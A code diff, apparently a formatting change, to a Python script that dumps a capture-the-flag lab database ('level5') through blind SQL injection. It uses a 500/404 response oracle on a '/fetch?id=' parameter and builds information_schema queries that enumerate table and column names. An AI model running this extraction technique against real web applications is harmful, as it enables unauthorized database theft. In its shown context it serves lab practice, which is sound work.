@@ -2,6 +2,7 @@
 """Full blind dump of level5 DB (v2, consistent encoding).
 Oracle: /fetch?id=3 AND <cond> -> 500 TRUE / 404 FALSE.
 """
+
 import json
 import os
 import time
@@ -104,8 +105,10 @@ def q_table_names(cache):
     names = cache["tables"]
     guard = "zzz"
     while True:
-        expr = (f"(SELECT MAX(table_name) FROM information_schema.tables "  # noqa: S608 — CTF extraction against the lab DB
-                f"WHERE table_schema='level5' AND table_name<'{guard}')")
+        expr = (
+            f"(SELECT MAX(table_name) FROM information_schema.tables "  # noqa: S608 — CTF extraction against the lab DB
+            f"WHERE table_schema='level5' AND table_name<'{guard}')"
+        )
         name = extract(expr, 60, f"tbl_{len(names)}", cache)
         if not name:
             break
@@ -122,9 +125,11 @@ def q_columns(table, cache):
     cols = cache[f"cols_{table}"]
     guard = "zzz"
     while True:
-        expr = (f"(SELECT MAX(column_name) FROM information_schema.columns "  # noqa: S608 — CTF extraction against the lab DB
-                f"WHERE table_schema='level5' AND table_name='{table}' "
-                f"AND column_name<'{guard}')")
+        expr = (
+            f"(SELECT MAX(column_name) FROM information_schema.columns "  # noqa: S608 — CTF extraction against the lab DB
+            f"WHERE table_schema='level5' AND table_name='{table}' "
+            f"AND column_name<'{guard}')"
+        )
         col = extract(expr, 80, f"col_{table}_{len(cols)}", cache)
         if not col:
             break
